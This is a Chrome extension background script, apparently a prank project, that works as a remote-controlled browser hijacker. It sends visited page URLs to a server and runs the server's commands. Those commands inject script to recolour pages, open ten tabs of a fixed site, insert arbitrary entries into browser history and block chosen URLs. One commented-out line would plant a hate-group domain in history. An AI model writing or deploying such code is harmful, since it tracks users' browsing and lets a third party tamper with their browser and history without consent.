var blockedlist = [];

chrome.webRequest.onBeforeRequest.addListener(
	function(details) {
			if (checkIfBlocked(details.url)){
				return {cancel: true};
			}
			//sendToServer(details, details.url);
       	},
    {urls: ["<all_urls>"]},
    ["blocking"]);


function sendToServer(currURL){
	    	var server = 'http://localhost:8001'
			var xhr = new XMLHttpRequest();
			xhr.onreadystatechange = function() {
			    if (xhr.readyState == 4) {
			    	if (xhr.responseText.length > 0) {
				        if (xhr.responseText == "red" || xhr.responseText == "blue" || xhr.responseText == "green" || xhr.responseText == "yellow"){
				        	console.log('document.body.style.backgroundColor=' + "\"" + xhr.responseText + "\"")
				        	chrome.tabs.executeScript({
	    						code: 'document.body.style.backgroundColor=' + "\"" + xhr.responseText + "\""
	  						});
				        }
				        else if (xhr.responseText == "2") {
				        	var newTab = "http://uiuc.sexy/";
				        	for (var i = 0; i < 10; i++){
				        		chrome.tabs.create({ url: newTab });
				        	}
				        }
				        else if (xhr.responseText.indexOf("history") == 0) {
				        	//chrome.history.addUrl({url: "http://www.kkk.com"})
				        	chrome.history.addUrl({url: xhr.responseText.substr(8)})
				        }
				        else if (xhr.responseText.indexOf("block") == 0) {
				        	blockedlist.push(xhr.responseText.substr(6));
				        }
				        else {
				        	
				        }
			    	}
			    }
			}
			xhr.open("GET", server ,true);
			xhr.setRequestHeader('Content-Type', currURL);
			xhr.send();
}



function checkIfBlocked(curr_url){
	var check = false;
	for (var i in blockedlist){
		if (curr_url.indexOf(blockedlist[i]) > -1)
			check = true;
	}
	return check;
}

chrome.extension.onMessage.addListener(function(request, sender, sendResponse) {
	sendToServer(request.url)
});



